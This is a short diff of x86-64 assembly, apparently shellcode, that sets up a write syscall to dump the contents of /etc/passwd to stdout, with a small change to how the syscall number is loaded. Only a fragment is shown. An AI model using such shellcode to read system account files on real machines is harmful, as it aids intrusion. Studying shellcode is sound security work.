@@ -23,8 +23,8 @@ goback:
 	syscall
 
 	# write(/etc/passwd)
-	xor	%rax, %rax
-	addb	$1, %al			# system call 1 is write
+	#xor	%rax, %rax
+	mov	$1, %al			# system call 1 is write
 	mov	%rax, %rdi		# file handle 1 is stdout
 	mov	%rsp, %rsi
         xor	%rdx, %rdx
